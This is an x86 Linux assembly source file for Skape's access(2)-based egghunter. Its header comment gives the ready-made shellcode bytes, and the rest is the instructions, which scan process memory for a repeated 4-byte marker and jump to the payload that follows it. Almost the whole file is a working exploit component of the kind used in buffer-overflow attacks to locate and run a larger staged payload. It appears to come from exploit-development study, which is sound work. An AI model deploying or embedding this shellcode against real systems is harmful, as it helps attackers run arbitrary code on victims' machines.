;   Skape's egghunter: access(2) revised
;   Shellcode generated: "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
;   TODO: Add comments
global _start

section .text

_start:
    xor edx, edx
IncPage:
    or dx, 0xfff
IncAddr:
    inc edx
    lea ebx, [edx+0x4]
    push byte 0x21
    pop eax
    int 0x80
    cmp al, 0xf2
    jz IncPage
    mov eax, 0x50905090
    mov edi, edx
    scasd
    jnz IncAddr
    scasd
    jnz IncAddr
    jmp edi